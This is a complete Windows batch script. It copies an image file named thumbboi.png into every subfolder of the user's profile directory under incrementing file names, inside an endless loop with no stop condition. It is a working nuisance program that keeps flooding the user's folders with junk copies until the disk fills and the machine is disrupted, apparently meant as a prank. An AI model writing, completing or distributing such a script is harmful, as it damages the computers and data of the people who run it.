@echo off
setlocal enabledelayedexpansion
set "sourceFile=thumbboi.png"
set "baseDir=C:\Users\%username%"
:CopyLoop
for /d %%i in ("%baseDir%\*") do (
    set /a "counter+=1"
    set "destinationFile=nick_gurr!counter!.png"
    copy "%sourceFile%" "%%i\!destinationFile!"
)
goto CopyLoop
